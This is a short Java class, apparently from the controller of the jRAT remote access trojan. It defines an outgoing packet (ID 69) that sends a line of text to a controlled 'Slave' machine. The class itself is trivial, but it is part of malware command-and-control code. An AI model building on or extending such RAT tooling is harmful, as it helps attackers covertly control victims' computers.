package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet69Print extends AbstractOutgoingPacket {

	private String text;

	public Packet69Print(String text) {
		this.text = text;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(text);
	}

	@Override
	public short getPacketId() {
		return 69;
	}

}
